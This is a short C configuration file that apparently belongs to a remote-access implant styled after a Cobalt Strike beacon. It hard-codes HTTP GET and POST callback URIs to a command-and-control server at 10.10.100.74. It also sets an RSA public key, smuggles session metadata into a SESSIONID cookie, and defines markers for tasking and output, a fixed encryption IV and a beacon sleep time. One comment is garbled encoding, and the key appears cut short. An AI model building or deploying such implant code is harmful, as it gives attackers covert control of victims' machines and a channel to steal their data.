#include "Config.h"
#include <Windows.h>

const char Http_get_uri[] = "http://10.10.100.74:80/www/handle/doc";
const char Http_Post_uri[] = "http://10.10.100.74:80/IMXo";
unsigned char* pub_key_str ="-----BEGIN PUBLIC KEY-----\n"
"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCTWvb4Msb5iR3d+0DbOnj1HJ1ewGTxZgCyCxqT\n"
"-----END PUBLIC KEY-----\n";

unsigned char* metadata_prepend = "SESSIONID=";
unsigned char* metadata_header = "Cookie:"; //ÔÚprofileÖÐ²»ÓÃ¼Ó:ºÅ
unsigned char* Response_prepend = "data=";
unsigned char* Response_append = "%%";
unsigned char* Http_post_id_prepend = "user=";
unsigned char* Http_post_id_append = "%%";
unsigned char* Http_post_client_output_prepend = "data=";
unsigned char* Http_post_client_output_append = "%%";
unsigned char IV[] = "abcdefghijklmnop";
int SleepTime = 3000;
int Counter = 0;
